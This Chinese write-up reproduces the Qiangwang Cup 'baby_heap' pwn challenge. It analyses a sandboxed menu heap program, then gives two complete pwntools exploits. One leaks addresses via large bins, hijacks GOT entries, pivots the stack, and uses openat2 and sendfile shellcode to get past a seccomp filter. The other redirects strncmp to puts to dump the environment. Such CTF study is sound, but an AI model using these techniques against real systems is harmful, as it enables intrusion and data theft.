赛后复现了一下比赛时没打出来的baby\_heap，跟其他师傅一起交流了一下，涨了不少见识。因为是复现，所以我的libc用的是本地的libc，强网杯提供的libc版本我还真是在网上没找到ld，没法patchelf到

分析函数
====

先来看`main函数`都有些什么，所有函数和部分变量名我已修改好，可以看到是经典的`菜单`布局

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-bfeb976f2fa0c39118a2c290358badfda8a7a44c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d4ab2e871f728bde37ae9a5ad21a8b28c5dec154.png)

我们来看几个比较重要的函数，首先是`set_IO`

框柱的两个函数是关键，在if条件判断时会进行条件内的运算，可以看到`memset`会使我们`_IO_wfile_jumps`及其往后**0x300**字节的数据会被清零，意味着我们**没法使用House of apple**的操作；而`mprotect`会在`_IO_wfile_jumps_mmap`及其往后**0x1000**字节处只给予**读**权限，因此我们无法修改它

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-40720bc9a508acc1a9e4bf4e157e7df9fe684a7d.png)

沙箱禁用的函数不用多说，禁`execve,open,openat`，老一套

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8ce657577f1461e5e9ce1dd8f4210e2e9506046c.png)

`add`函数，最多申请**5个堆**且size位于\[0x500,0x600)这个区间内

![屏幕截图 2024-11-06 163827.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-da549b1476f01e1a90a1a29a48ad110d4fa34503.png)

`delete`函数，经典的`UAF`

![屏幕截图 2024-11-06 163944.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-779853cb1fec914ce0afec59b0fdeb7c3f7ded87.png)

`edit`函数，只有一次修改机会

![屏幕截图 2024-11-06 164537.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-4c672f0e229f4c9b74d9fab979d939816a43e8e7.png)

`show`函数，只有一次展示机会

![屏幕截图 2024-11-06 164357.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-20c2f03859f248b986dec43cfb5b678637f1d199.png)

`environment`函数，有`setenv,getenv,putenv`函数，有着本题的漏洞点

![屏幕截图 2024-11-06 165238.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d03a5e9b31271dfd364d5d934b4116758e5d051f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0f6d8647bdc22af082a47ab0937ff91a89c6c820.png)

`write_whatever`函数，能够**完成限定地址内的地址写**，也是本题的利用点之一

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5d178c00055ba343cc1139ca7483f3c75975d798.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e5769bd2ea91a23fe624dfc783869b80245818fd.png)

putenv函数
========

putenv的函数原型

```C
putenv(char *string)
```

格式是`name=value`，**前者对应环境变量名，后者对应环境变量值**。当执行这个函数后，对应环境变量的值会发生修改（不会为这个环境变量额外分配内存，是覆盖）

putenv调用链: `strchr-->__libc_alloca_cutoff-->strlen-->__add_to_environ`

原本来说，经过这一串调用链后，**最终在\_\_add\_to\_environ中修改USER的值**。但在这道题中，这个函数是有漏洞的，也就是我们的`strlen`函数，它在libc.so.6文件的`.got.plt`段中紧挨着`_GLOBAL_OFFSET_TABLE_+16`的位置，而`_GLOBAL_OFFSET_TABLE_+16`存储着我们`_dl_runtime_resolve_xsavec`，也就是**解析我们真实地址的函数**，通过**任意地址写**，我们完全有能力控制程序执行流来进行我们想要的操作。这是一种解法。

第二种解法需要依赖`__add_to_environ`函数里包含的`strncmp`函数，如果我们把`strncmp`修改为任意的`输出函数`，就可以把环境内`flag`的值给输出出来。不过我个人更倾向于这是非预期，因为出题人说失误没清环境变量里的flag。

解法
==

一：篡改`strlen@got.plt`指向
----------------------

### 思路：

我们再sandbox里已知禁用了`execve,open,openat`函数，但是Linux内核在5.6引入了`openat2`系统调用，是**open的增强版**，但这不是库函数，因此**只能自己手动构造汇编syscall**,`rax = 0x1B5`。而鉴于libc的版本是2.35，所以setcontext的利用已经是比较困难了（需要找magic来转换，很难找），既然我们已经要手动构造汇编了，那么不如**直接用shellcraft.read和write或者直接sendfile**。只要我们能成功执行这一段代码，那基本就解决了。所以我们**需要足够的空间去塞满这些代码，而堆空间大小也够**，那么我们可以考虑**栈迁移到堆上**，并给予可读可写可执行权限，用`mprotect`来修改权限，而这所有的布局都需要`GOT[0],GOT[1],strlen@got.plt`来实现

### 动调过程

先定义好各函数体

```Python
def cmd(choice):
    p.sendlineafter(b'Enter your choice: \n', str(choice).encode())

def add(size):
    cmd(1)
    p.sendlineafter(b'Enter your commodity size \n', str(size).encode())

def delete(index):
    cmd(2)
    p.sendlineafter(b'Enter which to delete: \n', str(index).encode())

def edit(index, content):
    cmd(3)
    p.sendlineafter(b'Enter which to edit: \n', str(index).encode())
    p.sendlineafter(b'Input the content \n',content)

def show(index):
    cmd(4)
    p.sendlineafter(b'Enter which to show: \n', str(index).encode())
```

因为这道题我们**只能申请large\_bins大小的堆**，所以默认就用large\_bins\_attack的方法泄露libc和heap，**布置好大小堆**。

```Python
#注：libc用的Ubuntu22.04默认的libc，即GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
add(0x550) #p1
add(0x590)
add(0x540) #p2
delete(1) #再add一次就进large_bins
add(0x590)
delete(3) #unsorted_bins
show(1)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x21a120
p.recv(10) #接收Llibc后有10字节我们不需要的数据，直接舍掉
heap = u64(p.recv(6).ljust(8,b'\x00'))
heap_base = heap - 0x1950
```

此刻，我们获得了基地址，想要使用orw，我们需要合适的gadget，在ROP链里我们需要使用的函数只有`mprotect`，与之相关的寄存器有`rdi,rsi,rdx`，所以我们直接通过相对偏移获得即可并构造ROP链

```Python
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_r12 = libc_base + 0x11f497
New_orw = p64(pop_rdi) + p64(heap - 0x950) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(mprotect) + p64(heap+0x78)
New_orw += asm(shellcraft.pushstr('./flag') +  shellcraft.openat2(-100, 'rsp', heap_base+0x3000, 0x30) + shellcraft.sendfile(1, 3, 0, 0x1000))
```

ROP链构造好后，我们需要思考的就是**如何调用到它**。这时候就用得上我们的`GOT[0],GOT[1],strlen@got.plt`了。我们可以在libc里边清楚地看到在`.got.plt`段中，这三个是**紧挨在一起**的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c261fbd2c331d6c4119b9c0fb86eec503789a076.png)

再加上前面我们**有部分地址写**，那么我们可以构造出通过修改`GOT[0],GOT[1],strlen@got.plt`来进行调用，实现栈迁移调用ROP链

首先看正常的首次调用链

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-53258e75c8b085fc5f891d1d2ac789e637234fcc.png)

如果我们对调用链进行这样的修改

```Python
[_GLOBAL_OFFSET_TABLE_ + 8]  = heap_under_controlled
[_GLOBAL_OFFSET_TABLE_ + 16] = pop_rsp_.....
strlen@got.plt----&gt; addr : push    cs:_GLOBAL_OFFSET_TABLE_ + 8     #addr位于plt段中，用来调用_GLOBAL_OFFSET_TABLE_ + 8
```

那么这串链子就会变成如下图所示

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f07c369cf53cddf2153cf493a6217ec917cdabd9.png)

如果我们**在可控堆内完成了布局**，在栈迁移时跳转到堆的时候就等同于调用了ROP链，只需要一路前进即可

所以我们需要在`write_whatever`函数体内完成地址的修改

```Python
pop_rsp_13_14_15_rbp = libc_base + 0x2a73f
PLT_GOT_0 = libc_base + 0x28000
cmd(6)
p.sendafter(b'Input your target addr \n',p64(GOT_1))
p.send(p64(pop_rsp_13_14_15_rbp) + p64(PLT_GOT_0))
```

但是**仅仅只是修改了`GOT[1]和strlen@got.plt`还是不够的**，我们会发现**GOT\[0\]内写入的是我们的p2**，小堆块，而**小堆块里没有任何内容**，我们ret的时候就会发生错误。因为我们唯一一次的edit机会已经使用过了，所以我们只能把p2给申请出来，这样在`unlink_chunk.constprop`的操作下，**GOT\[0\]内写入的就是我们的p1**了，有我们构造的ROP链

```Python
add(0x538)
```

完成的效果如图所示，可以看到`GOT[0],GOT[1],strlen@got.plt`均被修改完成

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d858c3c91448d18dbea1fac13e2cf12fc0b96bba.png)

在触发了putenv函数后也是成功拿下了flag

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7de79700aa39ea77f3c4720bf68a457d7a57ec65.png)

### exp

```Python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

p = process('./heap')
libc = ELF('./libc.so.6')

def cmd(choice):
    p.sendlineafter(b'Enter your choice: \n', str(choice).encode())

def add(size):
    cmd(1)
    p.sendlineafter(b'Enter your commodity size \n', str(size).encode())

def delete(index):
    cmd(2)
    p.sendlineafter(b'Enter which to delete: \n', str(index).encode())

def edit(index, content):
    cmd(3)
    p.sendlineafter(b'Enter which to edit: \n', str(index).encode())
    p.sendlineafter(b'Input the content \n',content)

def show(index):
    cmd(4)
    p.sendlineafter(b'Enter which to show: \n', str(index).encode())
add(0x550) #p1大堆块
add(0x590)
add(0x540) #p2小堆块
delete(1)
add(0x590)
delete(3)
show(1)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x21a120
log.success('libc_base==>'+hex(libc_base))
p.recv(10) #舍弃10字节的垃圾数据
heap = u64(p.recv(6).ljust(8,b'\x00')) #p1的堆地址
log.success('heap==>'+hex(heap))
heap_base = heap - 0x1950
log.success('heap_base==>'+hex(heap_base))
GOT_0 = libc_base + 0x219008
log.success('GOT_0==>'+hex(GOT_0))
GOT_1 = libc_base + 0x219010
log.success('GOT_1==>'+hex(GOT_1))
PLT_GOT_0 = libc_base + 0x28000
mprotect = libc_base + libc.sym['mprotect']
log.success('mprotect==>'+hex(mprotect))
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_r12 = libc_base + 0x11f497
pop_rsp_13_14_15_rbp = libc_base + 0x2a73f

New_orw = p64(pop_rdi) + p64(heap - 0x950) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(mprotect) + p64(heap+0x78)
New_orw += asm(shellcraft.pushstr('./flag') +  shellcraft.openat2(-100, 'rsp', heap_base+0x3000, 0x18) + shellcraft.sendfile(1, 3, 0, 0x1000)) #openat系统调用里'-100'代表当前目录,'rsp'则是取当前rsp地址的值，heap_base+0x3000是结构体，当这里边为空时，以“只读”打开，不指定模式，不处理符号链接。0x18是结构体大小，因为struct里有3个u64参数，刚好0x18字节

edit(1,p64(pop_rdi) + p64(GOT_0-0x20) + p64(pop_rdi) + p64(GOT_0-0x20) + New_orw) #往GOT[0]写入p2地址

cmd(6)

p.sendafter(b'Input your target addr \n',p64(GOT_1))
pause()
p.send(p64(pop_rsp_13_14_15_rbp) + p64(PLT_GOT_0)) #GOT[0]-->pop_rsp...    #strlen@got.plt-->PLT_GOT_0
add(0x538) #修改GOT[0]存储的地址为p1

cmd(5)
#gdb.attach(p)

p.sendlineafter(b"Maybe you will be sad !",str(2).encode())
p.interactive()
```

二：篡改`strncmp@got.plt`指向(非预期)
----------------------------

先说为什么非预期，出题人在赛后解释说忘记把flag从环境变量里删除了，导致了这种非预期的出现。

现在说这种非预期解法

在分析**putenv函数调用链**时，我们提到它最终修改环境变量的函数是`__add_to_environ`，而\_\_add\_to\_environ内部的`strncmp`是环境变量匹配的关键，**它会根据name的名字是否相等来一个个向下查询，直至name相等后改变value**，因此它会不断调用`strncmp`这个函数，如果我们将`strncmp@got.plt`指向puts或者printf等**输出函数**，那么就可以打印出所有环境变量及其对应的值，在比赛时估计就是这样把藏在环境变量内部的flag值给打出来了，不过我本地打试不出这种结果，环境不同

相比于上一个解法，这个就简单了很多,基本没什么需要修改的地方

```Python
strncmp_got = libc_base + 0x219118
puts = libc_base + libc.sym['puts']
p.sendafter(b'Input your target addr \n',p64(strncmp_got))
p.send(p64(puts))
# strncmp@got.plt-->puts
cmd(5)
p.sendlineafter(b'Maybe you will be sad !\n',b'2')
```

### exp

```Python
add(0x500)
add(0x500)
delete(1)
show(1)
p.recvuntil(b'The content is here \n')
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
log.success('libc_base==>'+hex(libc_base))
strncmp_got = libc_base + 0x219000 + 8*0x23
log.success('strncmp_got==>'+hex(strncmp_got))
puts = libc_base + libc.sym['puts']
log.success('puts==>'+hex(puts))

cmd(6)
p.sendafter(b'Input your target addr \n',p64(strncmp_got))
pause()
p.send(p64(puts))

cmd(5)
# gdb.attach(p)
p.sendlineafter(b'Maybe you will be sad !\n',b'2')

p.interactive()
```

总结
==

这道题可以为以后的堆利用提供新的思路，当有strlen且能够修改GOT\[0\],GOT\[1\]的时候，可以尝试结合`mprotect,openat2,sendfile`来获得flag而不是传统的`setcontext`。但是这种条件过于苛刻，基本上很难再有利用的机会了